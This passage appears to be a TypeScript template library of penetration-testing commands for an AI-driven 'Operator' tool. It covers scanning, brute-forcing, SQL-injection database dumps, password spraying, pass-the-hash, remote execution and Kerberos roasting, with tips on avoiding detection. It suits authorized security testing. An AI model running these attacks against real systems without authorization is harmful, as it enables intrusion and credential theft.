// Command template library — single source of truth for the AI Operator prompt
// and the Command Library page.

export type Phase = 'recon' | 'scanning' | 'enumeration' | 'exploitation' | 'post_exploitation'

export type Category =
  | 'Network'
  | 'Web'
  | 'Active Directory'
  | 'OSINT'
  | 'Cloud'
  | 'Exploitation'
  | 'Post-Exploitation'
  | 'Metasploit'

export interface CommandTemplate {
  id: string
  tool: string
  label: string
  category: Category
  phase: Phase
  description: string
  when_to_use: string
  command: string
  vars: string[]        // variable names that appear in the command
  details?: string      // extra usage notes (valid flags, gotchas) surfaced to the AI Operator prompt
  tags?: string[]
  mitre_techniques?: string[]   // ATT&CK T-IDs (e.g. "T1046", "T1595.003")
}

export const TEMPLATES: CommandTemplate[] = [

  // ── NMAP ────────────────────────────────────────────────────────────────────

  {
    id: 'nmap-full-tcp',
    tool: 'nmap',
    label: 'Full TCP SYN Scan',
    category: 'Network',
    phase: 'scanning',
    description: 'Scans all 65535 TCP ports with service/version detection, OS fingerprinting, and default NSE scripts.',
    when_to_use: 'Use this when you have time and need a complete picture of every TCP service running on a target. Best run after masscan narrows the open ports to speed things up.',
    command: 'sudo nmap -sS -sV -sC -O -p- --open -T4 -v {{ target }}',
    vars: ['target'],
    tags: ['nmap', 'tcp', 'recon', 'scanning'],
    mitre_techniques: ['T1046'],
  },
  {
    id: 'nmap-quick',
    tool: 'nmap',
    label: 'Quick Top-1000 Scan',
    category: 'Network',
    phase: 'scanning',
    description: 'Fast scan of the 1000 most common ports with version detection.',
    when_to_use: 'Use this when you need a quick initial look at a target and don\'t want to wait for a full port scan. Good for first contact on any host.',
    command: 'nmap -sV --top-ports 1000 -T4 {{ target }}',
    vars: ['target'],
    tags: ['nmap', 'quick', 'recon'],
    mitre_techniques: ['T1046'],
  },
  {
    id: 'nmap-udp',
    tool: 'nmap',
    label: 'UDP Service Scan',
    category: 'Network',
    phase: 'scanning',
    description: 'Scans top 200 UDP ports — catches SNMP, DNS, TFTP, NTP, and other UDP-only services.',
    when_to_use: 'Use this when the TCP scan looks clean but you suspect additional services. UDP often exposes SNMP (161) which leaks configuration data, or DNS (53) for zone transfers.',
    command: 'sudo nmap -sU --top-ports 200 -T4 {{ target }}',
    vars: ['target'],
    tags: ['nmap', 'udp', 'snmp'],
    mitre_techniques: ['T1046'],
  },
  {
    id: 'nmap-vuln',
    tool: 'nmap',
    label: 'Vulnerability Script Scan',
    category: 'Network',
    phase: 'scanning',
    description: 'Runs NSE vulnerability scripts against discovered services — checks for known CVEs, misconfigurations, and weak credentials.',
    when_to_use: 'Use this when you\'ve already found open ports and want nmap to automatically test for common CVEs. Particularly useful on services like SMB (ms17-010), FTP (anonymous login), and HTTP (shellshock).',
    command: 'nmap --script vuln -p {{ ports }} {{ target }}',
    vars: ['ports', 'target'],
    tags: ['nmap', 'vuln', 'cve'],
    mitre_techniques: ['T1046', 'T1595.002'],
  },
  {
    id: 'nmap-web',
    tool: 'nmap',
    label: 'Web Service Scan',
    category: 'Web',
    phase: 'scanning',
    description: 'Targets common web ports with HTTP enumeration scripts — discovers web server type, directories, and methods.',
    when_to_use: 'Use this when you need a focused web scan without running a full port sweep. Good for quickly fingerprinting what\'s on ports 80, 443, 8080, 8443.',
    command: 'nmap -sV -p 80,443,8080,8443,8000,8888 --script http-enum,http-methods,http-headers {{ target }}',
    vars: ['target'],
    tags: ['nmap', 'web', 'http'],
    mitre_techniques: ['T1046', 'T1595.002'],
  },
  {
    id: 'nmap-ad-ports',
    tool: 'nmap',
    label: 'Active Directory Port Scan',
    category: 'Active Directory',
    phase: 'recon',
    description: 'Scans all common AD-related ports: Kerberos, LDAP, SMB, RPC, WinRM, DNS.',
    when_to_use: 'Use this as the first scan on a suspected domain controller. The open port combination tells you exactly what AD services are exposed and what attacks are possible.',
    command: 'nmap -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 {{ target }}',
    vars: ['target'],
    tags: ['nmap', 'active-directory', 'kerberos', 'ldap'],
    mitre_techniques: ['T1046', 'T1018'],
  },

  // ── MASSCAN ─────────────────────────────────────────────────────────────────

  {
    id: 'masscan-full',
    tool: 'masscan',
    label: 'Full Port Discovery',
    category: 'Network',
    phase: 'scanning',
    description: 'Scans all 65535 TCP ports at 1000 packets/sec — significantly faster than nmap for wide ranges.',
    when_to_use: 'Use this when you need to find open ports across a host or subnet quickly before handing off to nmap for service detection. Ideal for large IP ranges where nmap -p- would be too slow.',
    command: 'sudo masscan {{ target }} -p1-65535 --rate=1000 -oL masscan_results.txt',
    vars: ['target'],
    tags: ['masscan', 'port-discovery', 'fast'],
    mitre_techniques: ['T1046'],
  },
  {
    id: 'masscan-subnet',
    tool: 'masscan',
    label: 'Subnet Common Ports',
    category: 'Network',
    phase: 'scanning',
    description: 'Sweeps a /24 subnet for the most common service ports.',
    when_to_use: 'Use this during internal network engagements when you need to quickly map all live hosts and services across a subnet. Safer rate than full-range to avoid overwhelming switches.',
    command: 'sudo masscan {{ target }}/24 -p21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443 --rate=500',
    vars: ['target'],
    tags: ['masscan', 'subnet', 'internal'],
    mitre_techniques: ['T1046', 'T1018'],
  },

  // ── RUSTSCAN ────────────────────────────────────────────────────────────────

  {
    id: 'rustscan-nmap-handoff',
    tool: 'rustscan',
    label: 'Fast Scan → nmap Handoff',
    category: 'Network',
    phase: 'scanning',
    description: 'Uses rustscan to find open ports in seconds then automatically passes them to nmap for service/version detection.',
    when_to_use: 'Use this when you want the speed of rustscan for initial discovery combined with the depth of nmap for service identification. Best of both worlds — finds all open ports then fills in the details.',
    command: 'rustscan -a {{ target }} --ulimit 5000 -- -sV -sC',
    vars: ['target'],
    tags: ['rustscan', 'nmap', 'fast', 'port-discovery'],
    mitre_techniques: ['T1046'],
  },

  // ── GOBUSTER ─────────────────────────────────────────────────────────────────

  {
    id: 'gobuster-dir',
    tool: 'gobuster',
    label: 'Directory Brute-Force',
    category: 'Web',
    phase: 'enumeration',
    description: 'Brute-forces web directories and files using a common wordlist. Discovers admin panels, backup files, and hidden endpoints.',
    when_to_use: 'Use this when you\'ve found a web server and need to discover paths beyond what\'s linked. Often finds /admin, /backup, /config, /.git, and other sensitive endpoints the application doesn\'t expose directly.',
    command: 'gobuster dir -u http://{{ target }} -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt,bak,old',
    vars: ['target'],
    tags: ['gobuster', 'web', 'directory', 'enumeration'],
    mitre_techniques: ['T1595.003'],
  },
  {
    id: 'gobuster-dir-large',
    tool: 'gobuster',
    label: 'Directory Brute-Force (Large Wordlist)',
    category: 'Web',
    phase: 'enumeration',
    description: 'Thorough directory discovery using a large SecLists wordlist.',
    when_to_use: 'Use this when the common wordlist scan came back thin. The SecLists directory-2.3-medium.txt covers significantly more paths and often catches what common.txt misses.',
    command: 'gobuster dir -u http://{{ target }} -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -x php,html,js,json,txt',
    vars: ['target'],
    tags: ['gobuster', 'web', 'seclists'],
    mitre_techniques: ['T1595.003'],
  },
  {
    id: 'gobuster-dns',
    tool: 'gobuster',
    label: 'DNS Subdomain Enumeration',
    category: 'OSINT',
    phase: 'recon',
    description: 'Brute-forces subdomains of a target domain using DNS resolution.',
    when_to_use: 'Use this when you need to find subdomains beyond what passive tools return. Active enumeration catches internal-facing or recently created subdomains that aren\'t indexed anywhere.',
    command: 'gobuster dns -d {{ target }} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 30',
    vars: ['target'],
    tags: ['gobuster', 'dns', 'subdomains'],
    mitre_techniques: ['T1595.003', 'T1590.001'],
  },
  {
    id: 'gobuster-vhost',
    tool: 'gobuster',
    label: 'Virtual Host Discovery',
    category: 'Web',
    phase: 'enumeration',
    description: 'Discovers virtual hosts on an IP by brute-forcing the Host header.',
    when_to_use: 'Use this when an IP hosts multiple sites (common on shared hosting or internal servers). Finding hidden vhosts often reveals staging, admin, or API endpoints that aren\'t publicly linked.',
    command: 'gobuster vhost -u http://{{ target }} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain',
    vars: ['target'],
    tags: ['gobuster', 'vhost', 'web'],
    mitre_techniques: ['T1595.003'],
  },

  // ── FFUF ─────────────────────────────────────────────────────────────────────

  {
    id: 'ffuf-dir',
    tool: 'ffuf',
    label: 'Directory Discovery',
    category: 'Web',
    phase: 'enumeration',
    description: 'Fast directory and file fuzzing — faster than gobuster and more flexible.',
    when_to_use: 'Use this as a general-purpose web content discovery tool. Particularly good when you need speed or need to filter responses by status code, size, or word count.',
    command: 'ffuf -u http://{{ target }}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 40',
    vars: ['target'],
    tags: ['ffuf', 'web', 'directory'],
    mitre_techniques: ['T1595.003'],
  },
  {
    id: 'ffuf-params',
    tool: 'ffuf',
    label: 'GET Parameter Fuzzing',
    category: 'Web',
    phase: 'enumeration',
    description: 'Discovers hidden GET parameters on a specific endpoint.',
    when_to_use: 'Use this when you\'ve found an interesting endpoint and want to find undocumented parameters that might expose functionality, bypass auth, or trigger bugs. Common finds: debug=1, admin=true, id=, file=.',
    command: 'ffuf -u "http://{{ target }}/{{ path }}?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs {{ filter_size }}',
    vars: ['target', 'path', 'filter_size'],
    tags: ['ffuf', 'parameters', 'web'],
    mitre_techniques: ['T1595.003'],
  },
  {
    id: 'ffuf-vhost',
    tool: 'ffuf',
    label: 'Virtual Host Discovery',
    category: 'Web',
    phase: 'enumeration',
    description: 'Fuzzes the Host header to discover virtual hosts served by the same IP.',
    when_to_use: 'Use this when the server responds differently based on the Host header, or when you want to find internal vhosts. Filter by size to remove the default response.',
    command: 'ffuf -u http://{{ target }} -H "Host: FUZZ.{{ domain }}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -fs {{ filter_size }}',
    vars: ['target', 'domain', 'filter_size'],
    tags: ['ffuf', 'vhost', 'web'],
    mitre_techniques: ['T1595.003'],
  },
  {
    id: 'ffuf-post-fuzz',
    tool: 'ffuf',
    label: 'POST Body Parameter Fuzzing',
    category: 'Web',
    phase: 'exploitation',
    description: 'Fuzzes POST request body fields — useful for finding injection points in forms and APIs.',
    when_to_use: 'Use this when you\'ve identified a POST endpoint (login form, API) and want to find injectable fields or hidden parameters not in the visible form.',
    command: 'ffuf -u "http://{{ target }}/{{ path }}" -X POST -d "username=admin&FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200',
    vars: ['target', 'path'],
    tags: ['ffuf', 'post', 'injection'],
    mitre_techniques: ['T1190'],
  },

  // ── NIKTO ────────────────────────────────────────────────────────────────────

  {
    id: 'nikto-basic',
    tool: 'nikto',
    label: 'Web Server Vulnerability Scan',
    category: 'Web',
    phase: 'scanning',
    description: 'Comprehensive web server scan — checks for dangerous files, outdated software, misconfigurations, and common vulnerabilities.',
    when_to_use: 'Use this early on any web target. Nikto quickly surfaces low-hanging fruit: default credentials, dangerous HTTP methods (PUT/DELETE), exposed /server-status, and outdated server versions with known CVEs.',
    command: 'nikto -h {{ target }} -maxtime 300',
    vars: ['target'],
    tags: ['nikto', 'web', 'scanning'],
    mitre_techniques: ['T1595', 'T1190'],
  },
  {
    id: 'nikto-https',
    tool: 'nikto',
    label: 'HTTPS Target Scan',
    category: 'Web',
    phase: 'scanning',
    description: 'Runs nikto against an HTTPS target with SSL/TLS connection.',
    when_to_use: 'Use this when the web target is HTTPS only. The -ssl flag forces nikto to use TLS so it doesn\'t fall back to plain HTTP.',
    command: 'nikto -h {{ target }} -ssl -port 443 -maxtime 300',
    vars: ['target'],
    tags: ['nikto', 'https', 'ssl'],
    mitre_techniques: ['T1595', 'T1190'],
  },

  // ── NUCLEI ───────────────────────────────────────────────────────────────────

  {
    id: 'nuclei-web',
    tool: 'nuclei',
    label: 'Web Target CVE Scan',
    category: 'Web',
    phase: 'scanning',
    description: 'Runs 7000+ community templates against a web target — covers CVEs, misconfigurations, exposed panels, and default credentials.',
    when_to_use: 'Use this when you want broad automated vulnerability coverage on a web target. Nuclei is much more accurate than nikto for specific CVEs and covers modern frameworks. Limit to medium/high/critical to reduce noise.',
    command: 'nuclei -u http://{{ target }} -severity medium,high,critical -o nuclei_results.txt',
    vars: ['target'],
    tags: ['nuclei', 'web', 'cve', 'scanning'],
    mitre_techniques: ['T1595.002', 'T1190'],
  },
  {
    id: 'nuclei-tech',
    tool: 'nuclei',
    label: 'Technology Detection',
    category: 'Web',
    phase: 'recon',
    description: 'Identifies technology stack, CMS, frameworks, and libraries from HTTP responses.',
    when_to_use: 'Use this before exploitation to fingerprint exactly what the target is running. Knowing it\'s WordPress 5.8, Apache 2.4, or React helps you pick the right exploit templates.',
    command: 'nuclei -u http://{{ target }} -tags tech -silent',
    vars: ['target'],
    tags: ['nuclei', 'fingerprint', 'technology'],
    mitre_techniques: ['T1592.002'],
  },

  // ── FEROXBUSTER ──────────────────────────────────────────────────────────────

  {
    id: 'feroxbuster-recursive',
    tool: 'feroxbuster',
    label: 'Recursive Content Discovery',
    category: 'Web',
    phase: 'enumeration',
    description: 'Recursively discovers web directories and files — automatically fuzzes inside each discovered directory.',
    when_to_use: 'Use this over gobuster when you want deep discovery. Feroxbuster recurses into every directory it finds, which means you\'ll discover things nested several levels deep that single-pass tools miss.',
    command: 'feroxbuster -u http://{{ target }} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30 --depth 3',
    vars: ['target'],
    tags: ['feroxbuster', 'recursive', 'web'],
    mitre_techniques: ['T1595.003'],
  },

  // ── TESTSSL ──────────────────────────────────────────────────────────────────

  {
    id: 'testssl-audit',
    tool: 'testssl',
    label: 'TLS/SSL Full Audit',
    category: 'Web',
    phase: 'scanning',
    description: 'Tests cipher suites, certificate validity, protocol versions (SSLv3/TLSv1.0), and known vulnerabilities (BEAST, POODLE, Heartbleed, ROBOT).',
    when_to_use: 'Use this on any HTTPS service. Weak TLS configs are common findings in audits — TLS 1.0/1.1 support, weak ciphers, expired certs, and self-signed certs all make it into reports.',
    command: 'testssl.sh --severity MEDIUM {{ target }}:443',
    vars: ['target'],
    tags: ['testssl', 'tls', 'ssl', 'https'],
    mitre_techniques: ['T1595.002'],
  },

  // ── SQLMAP ───────────────────────────────────────────────────────────────────

  {
    id: 'sqlmap-auto',
    tool: 'sqlmap',
    label: 'Automatic Injection Detection',
    category: 'Web',
    phase: 'exploitation',
    description: 'Crawls the target and automatically tests all parameters for SQL injection.',
    when_to_use: 'Use this when you have a web target with forms or URL parameters and want sqlmap to find injection points automatically. The crawl covers pages you haven\'t manually identified.',
    command: 'sqlmap -u "http://{{ target }}" --batch --crawl=3 --level=3 --risk=2',
    vars: ['target'],
    tags: ['sqlmap', 'sqli', 'web'],
    mitre_techniques: ['T1190'],
  },
  {
    id: 'sqlmap-param',
    tool: 'sqlmap',
    label: 'Specific Parameter Test',
    category: 'Web',
    phase: 'exploitation',
    description: 'Tests a specific URL parameter for SQL injection.',
    when_to_use: 'Use this when you\'ve manually identified a suspicious parameter (e.g., id=, user=, search=) and want targeted injection testing rather than a crawl.',
    command: 'sqlmap -u "http://{{ target }}/{{ path }}?{{ param }}=1" -p {{ param }} --batch --dbs',
    vars: ['target', 'path', 'param'],
    tags: ['sqlmap', 'sqli', 'targeted'],
    mitre_techniques: ['T1190'],
  },
  {
    id: 'sqlmap-dump',
    tool: 'sqlmap',
    label: 'Database Dump',
    category: 'Web',
    phase: 'exploitation',
    description: 'Dumps the contents of a specific database table once injection is confirmed.',
    when_to_use: 'Use this after confirming SQLi to extract credentials, user data, or configuration from a specific table. Always document what you dump for the report.',
    command: 'sqlmap -u "http://{{ target }}/{{ path }}?{{ param }}=1" -D {{ database }} -T {{ table }} --dump --batch',
    vars: ['target', 'path', 'param', 'database', 'table'],
    tags: ['sqlmap', 'dump', 'data-extraction'],
    mitre_techniques: ['T1190', 'T1005'],
  },
  {
    id: 'sqlmap-request',
    tool: 'sqlmap',
    label: 'Test from Burp Request File',
    category: 'Web',
    phase: 'exploitation',
    description: 'Runs sqlmap against a saved Burp Suite HTTP request file — preserves all headers, cookies, and POST data.',
    when_to_use: 'Use this when you need to test a POST request or authenticated endpoint. Capture the request in Burp, save it to a file, and sqlmap will replay it with injection payloads across every parameter.',
    command: 'sqlmap -r {{ request_file }} --batch --level=3 --risk=2 --dbs',
    vars: ['request_file'],
    tags: ['sqlmap', 'burp', 'post', 'authenticated'],
    mitre_techniques: ['T1190'],
  },

  // ── HYDRA ────────────────────────────────────────────────────────────────────

  {
    id: 'hydra-ssh',
    tool: 'hydra',
    label: 'SSH Brute-Force',
    category: 'Exploitation',
    phase: 'exploitation',
    description: 'Brute-forces SSH login using username and password lists.',
    when_to_use: 'Use this when SSH (port 22) is open and you have a list of probable usernames. Often catches default credentials, service accounts with weak passwords, or reused passwords from credential dumps.',
    command: 'hydra -L {{ users_file }} -P {{ passwords_file }} {{ target }} ssh -t 4 -V',
    vars: ['users_file', 'passwords_file', 'target'],
    tags: ['hydra', 'ssh', 'brute-force'],
    mitre_techniques: ['T1110.001'],
  },
  {
    id: 'hydra-http-form',
    tool: 'hydra',
    label: 'HTTP Form Brute-Force',
    category: 'Web',
    phase: 'exploitation',
    description: 'Brute-forces a web login form by replaying POST requests with different credentials.',
    when_to_use: 'Use this when you\'ve found a login form and want to try credential lists. You need to identify the form\'s POST parameters and what the failure response looks like (the -F string).',
    command: 'hydra -L {{ users_file }} -P {{ passwords_file }} {{ target }} http-post-form "/{{ login_path }}:{{ post_params }}:F={{ fail_string }}"',
    vars: ['users_file', 'passwords_file', 'target', 'login_path', 'post_params', 'fail_string'],
    tags: ['hydra', 'http', 'form', 'web'],
    mitre_techniques: ['T1110.001'],
  },
  {
    id: 'hydra-smb',
    tool: 'hydra',
    label: 'SMB Credential Brute-Force',
    category: 'Active Directory',
    phase: 'exploitation',
    description: 'Brute-forces SMB authentication — useful for testing domain credentials at scale.',
    when_to_use: 'Use this on internal networks when SMB is accessible. Be careful with lockout thresholds — enumerate the password policy first with nxc before spraying.',
    command: 'hydra -L {{ users_file }} -P {{ passwords_file }} {{ target }} smb -V',
    vars: ['users_file', 'passwords_file', 'target'],
    tags: ['hydra', 'smb', 'brute-force'],
    mitre_techniques: ['T1110.001'],
  },

  // ── SEARCHSPLOIT ─────────────────────────────────────────────────────────────

  {
    id: 'searchsploit-service',
    tool: 'searchsploit',
    label: 'Search by Service + Version',
    category: 'Exploitation',
    phase: 'exploitation',
    description: 'Searches the local Exploit-DB copy for public exploits matching a service and version string. Only accepts plain keyword arguments — there is no --exploit flag.',
    when_to_use: 'Use this immediately after identifying a service version with nmap. Pass the service name and version as plain keywords: "searchsploit postgresql 9.6" not "searchsploit postgresql --exploit". Searchsploit will list all known public exploits by title and path.',
    command: 'searchsploit {{ service_name }} {{ service_version }}',
    vars: ['service_name', 'service_version'],
    details: 'Valid flags: -t (title-only search), -w (show web links), --id (show EDB-ID), -m <EDB-ID> (copy exploit). There is NO --exploit flag — do not invent flags.',
    tags: ['searchsploit', 'exploitdb', 'cve'],
    mitre_techniques: ['T1588.005'],
  },
  {
    id: 'searchsploit-copy',
    tool: 'searchsploit',
    label: 'Copy Exploit to Working Dir',
    category: 'Exploitation',
    phase: 'exploitation',
    description: 'Copies a specific exploit from the Exploit-DB local copy to the current directory for modification and use.',
    when_to_use: 'Use this after identifying a matching exploit with searchsploit. Pass the numeric EDB-ID (e.g. searchsploit -m 49933). Copying gives you a local file you can modify, compile, and adapt without affecting the original.',
    command: 'searchsploit -m {{ edb_id }}',
    vars: ['edb_id'],
    tags: ['searchsploit', 'copy', 'exploit'],
    mitre_techniques: ['T1588.005'],
  },

  // ── WHOIS / DIG ──────────────────────────────────────────────────────────────

  {
    id: 'whois-domain',
    tool: 'whois',
    label: 'Domain Ownership Lookup',
    category: 'OSINT',
    phase: 'recon',
    description: 'Retrieves domain registration info: registrar, creation date, expiry, nameservers, and registrant contact.',
    when_to_use: 'Use this as the very first step on any external domain target. Reveals who owns it, when it expires (sometimes targets are vulnerable during lapsed renewals), and which nameservers to query for DNS enumeration.',
    command: 'whois {{ target }}',
    vars: ['target'],
    tags: ['whois', 'osint', 'recon'],
    mitre_techniques: ['T1590.001'],
  },
  {
    id: 'dig-all',
    tool: 'dig',
    label: 'Full DNS Record Enumeration',
    category: 'OSINT',
    phase: 'recon',
    description: 'Queries all DNS record types for a domain — A, AAAA, MX, NS, TXT, SOA.',
    when_to_use: 'Use this to map the full DNS infrastructure. TXT records often expose SPF configuration, cloud providers, and verification tokens. NS records tell you which DNS provider to attack for zone transfers.',
    command: 'dig {{ target }} ANY +noall +answer',
    vars: ['target'],
    tags: ['dig', 'dns', 'osint'],
    mitre_techniques: ['T1590.002'],
  },
  {
    id: 'dig-zone-transfer',
    tool: 'dig',
    label: 'DNS Zone Transfer Attempt',
    category: 'OSINT',
    phase: 'recon',
    description: 'Attempts an AXFR zone transfer against the target\'s nameserver — dumps all DNS records if misconfigured.',
    when_to_use: 'Use this after identifying the authoritative nameserver. A successful zone transfer hands you the entire DNS map of the organization — every subdomain, internal host, and IP in one query.',
    command: 'dig @{{ nameserver }} {{ target }} AXFR',
    vars: ['nameserver', 'target'],
    tags: ['dig', 'zone-transfer', 'dns'],
    mitre_techniques: ['T1590.002'],
  },

  // ── THEHARVESTER / SUBFINDER ──────────────────────────────────────────────────

  {
    id: 'theharvester-all',
    tool: 'theHarvester',
    label: 'Passive OSINT Harvest',
    category: 'OSINT',
    phase: 'recon',
    description: 'Gathers emails, subdomains, names, and open ports from search engines, Certificate Transparency logs, and DNS aggregators.',
    when_to_use: 'Use this in the recon phase before touching the target. Results come from public sources only — no network traffic to the target. Great for building a target profile for phishing simulation or subdomain discovery.',
    command: 'theHarvester -d {{ target }} -b all -l 200',
    vars: ['target'],
    tags: ['theharvester', 'osint', 'emails', 'subdomains'],
    mitre_techniques: ['T1593', 'T1596'],
  },
  {
    id: 'subfinder-passive',
    tool: 'subfinder',
    label: 'Passive Subdomain Discovery',
    category: 'OSINT',
    phase: 'recon',
    description: 'Discovers subdomains from 40+ passive sources without touching the target — Certificate Transparency logs, DNS aggregators, threat intel APIs.',
    when_to_use: 'Use this for rapid passive subdomain enumeration. Subfinder is faster and more comprehensive than theHarvester for subdomains specifically. Combine with gobuster DNS for active brute-forcing.',
    command: 'subfinder -d {{ target }} -silent -o subfinder_results.txt',
    vars: ['target'],
    tags: ['subfinder', 'subdomains', 'passive', 'osint'],
    mitre_techniques: ['T1590.001'],
  },

  // ── ENUM4LINUX / SMB ─────────────────────────────────────────────────────────

  {
    id: 'enum4linux-full',
    tool: 'enum4linux',
    label: 'Full SMB/AD Enumeration',
    category: 'Active Directory',
    phase: 'enumeration',
    description: 'Full SMB and NetBIOS enumeration — users, groups, shares, password policy, OS info, RID cycling.',
    when_to_use: 'Use this when SMB (port 445) is open and you want as much information as possible without credentials. Often returns the local user list, share names, and domain name — critical for building an AD attack path.',
    command: 'enum4linux -a {{ target }}',
    vars: ['target'],
    tags: ['enum4linux', 'smb', 'active-directory', 'enumeration'],
    mitre_techniques: ['T1018', 'T1069.002', 'T1087.002', 'T1135'],
  },
  {
    id: 'smbclient-list',
    tool: 'smbclient',
    label: 'Anonymous Share Listing',
    category: 'Active Directory',
    phase: 'enumeration',
    description: 'Lists SMB shares accessible without credentials.',
    when_to_use: 'Use this for a quick check of what shares are publicly exposed before going deeper with enum4linux or nxc. Common finds: IPC$, SYSVOL, NETLOGON on domain controllers, and misconfigured shares on workstations.',
    command: 'smbclient -L //{{ target }} -N',
    vars: ['target'],
    tags: ['smbclient', 'smb', 'shares'],
    mitre_techniques: ['T1135'],
  },

  // ── NXC / NETEXEC ────────────────────────────────────────────────────────────

  {
    id: 'nxc-smb-null',
    tool: 'nxc',
    label: 'SMB Null Session Enum',
    category: 'Active Directory',
    phase: 'enumeration',
    description: 'Tests for anonymous SMB access and lists available shares.',
    when_to_use: 'Use this as the first nxc check on any SMB target. Null sessions reveal shares, OS version, hostname, and domain — all without credentials.',
    command: 'nxc smb {{ target }} -u \'\' -p \'\' --shares',
    vars: ['target'],
    tags: ['nxc', 'smb', 'null-session'],
    mitre_techniques: ['T1135', 'T1087'],
  },
  {
    id: 'nxc-password-policy',
    tool: 'nxc',
    label: 'Password Policy Enumeration',
    category: 'Active Directory',
    phase: 'enumeration',
    description: 'Retrieves the domain password policy — lockout threshold, minimum length, complexity requirements.',
    when_to_use: 'Use this BEFORE any password spraying. You need to know the lockout threshold to avoid locking accounts. If lockout is after 5 attempts, you can only spray once safely.',
    command: 'nxc smb {{ target }} -u \'\' -p \'\' --pass-pol',
    vars: ['target'],
    tags: ['nxc', 'password-policy', 'active-directory'],
    mitre_techniques: ['T1201'],
  },
  {
    id: 'nxc-user-enum',
    tool: 'nxc',
    label: 'LDAP User Enumeration',
    category: 'Active Directory',
    phase: 'enumeration',
    description: 'Enumerates all domain users via LDAP.',
    when_to_use: 'Use this when you have any domain credentials (even low-priv) and want the full user list. The output feeds directly into kerbrute password spray and AS-REP roasting user files.',
    command: 'nxc ldap {{ target }} -u {{ username }} -p {{ password }} --users',
    vars: ['target', 'username', 'password'],
    tags: ['nxc', 'ldap', 'users'],
    mitre_techniques: ['T1087.002'],
  },
  {
    id: 'nxc-spray',
    tool: 'nxc',
    label: 'Credential Password Spray',
    category: 'Active Directory',
    phase: 'exploitation',
    description: 'Sprays a single password against all domain hosts in a subnet.',
    when_to_use: 'Use this after confirming credentials work on one host and you want to check for password reuse across the environment. Run only after checking the password policy so you don\'t lock accounts.',
    command: 'nxc smb {{ target }}/24 -u {{ username }} -p {{ password }} --continue-on-success',
    vars: ['target', 'username', 'password'],
    tags: ['nxc', 'spray', 'lateral-movement'],
    mitre_techniques: ['T1110.003'],
  },
  {
    id: 'nxc-pth',
    tool: 'nxc',
    label: 'Pass-the-Hash',
    category: 'Active Directory',
    phase: 'exploitation',
    description: 'Authenticates using an NTLM hash instead of a plaintext password.',
    when_to_use: 'Use this when you\'ve captured NTLM hashes (via secretsdump, responder, or mimikatz) and want to authenticate without cracking them first. Works on SMB and WinRM depending on the service.',
    command: 'nxc smb {{ target }} -u {{ username }} -H {{ ntlm_hash }} --local-auth',
    vars: ['target', 'username', 'ntlm_hash'],
    tags: ['nxc', 'pass-the-hash', 'ntlm'],
    mitre_techniques: ['T1550.002'],
  },
  {
    id: 'nxc-exec',
    tool: 'nxc',
    label: 'Remote Command Execution',
    category: 'Active Directory',
    phase: 'exploitation',
    description: 'Executes a command on the remote host via SMB with valid credentials.',
    when_to_use: 'Use this when you have admin credentials and want to run a quick command without setting up a full shell. Good for confirming code execution before deploying a payload.',
    command: 'nxc smb {{ target }} -u {{ username }} -p {{ password }} -x "{{ command }}"',
    vars: ['target', 'username', 'password', 'command'],
    tags: ['nxc', 'execution', 'smb'],
    mitre_techniques: ['T1021.002'],
  },

  // ── KERBRUTE ─────────────────────────────────────────────────────────────────

  {
    id: 'kerbrute-userenum',
    tool: 'kerbrute',
    label: 'Kerberos User Enumeration',
    category: 'Active Directory',
    phase: 'scanning',
    description: 'Validates usernames against Kerberos pre-authentication — no failed login events generated.',
    when_to_use: 'Use this when you have no credentials and need to build a valid user list. Unlike LDAP or SMB enumeration, Kerberos pre-auth errors don\'t create Windows security event 4625 (failed logon), so it\'s much quieter.',
    command: 'kerbrute userenum --dc {{ target }} -d {{ domain }} /usr/share/seclists/Usernames/Names/names.txt',
    vars: ['target', 'domain'],
    tags: ['kerbrute', 'kerberos', 'user-enumeration', 'quiet'],
    mitre_techniques: ['T1087.002'],
  },
  {
    id: 'kerbrute-spray',
    tool: 'kerbrute',
    label: 'Kerberos Password Spray',
    category: 'Active Directory',
    phase: 'exploitation',
    description: 'Tests a single password against all users via Kerberos — avoids NTLM authentication noise.',
    when_to_use: 'Use this for password spraying when you want to avoid NTLM lockout events. Kerbrute spray is quieter than SMB spraying and works against all user accounts at once with a single password guess.',
    command: 'kerbrute passwordspray --dc {{ target }} -d {{ domain }} users.txt {{ password }}',
    vars: ['target', 'domain', 'password'],
    tags: ['kerbrute', 'spray', 'kerberos'],
    mitre_techniques: ['T1110.003'],
  },

  // ── IMPACKET ─────────────────────────────────────────────────────────────────

  {
    id: 'impacket-kerberoast',
    tool: 'impacket-GetUserSPNs',
    label: 'Kerberoasting',
    category: 'Active Directory',
    phase: 'enumeration',
    description: 'Requests TGS tickets for all service accounts (SPNs). Returned tickets can be cracked offline with hashcat.',
    when_to_use: 'Use this when you have any domain user credentials. Service accounts often have weak passwords and never get rotated. The TGS tickets can be cracked offline — no lockout risk, no noise after the initial request.',
    command: "impacket-GetUserSPNs '{{ domain }}/{{ username }}:{{ password }}' -dc-ip {{ target }} -request -outputfile kerberoast_hashes.txt",
    vars: ['domain', 'username', 'password', 'target'],
    tags: ['impacket', 'kerberoast', 'active-directory'],
    mitre_techniques: ['T1558.003'],
  },
  {
    id: 'impacket-asrep',
    tool: 'impacket-GetNPUsers',
    label: 'AS-REP Roasting',
    category: 'Active Directory',
    phase: 'enumeration',
    description: 'Retrieves AS-REP hashes for accounts with Kerberos pre-authentication disabled — crackable with hashcat mode 18200.',
    when_to_use: 'Use this when you have a user list but no credentials. Accounts with "Do not require Kerberos preauthentication" return a hash without needing a password. Service accounts and old accounts often have this set.',
    command: "impacket-GetNPUsers '{{ domain }}/' -dc-ip {{ target }} -usersfile users.txt -no-pass -format hashcat -outputfile asrep_hashes.txt",
    vars: ['domain', 'target'],
    tags: ['impacket', 'as-rep', 'kerberos'],
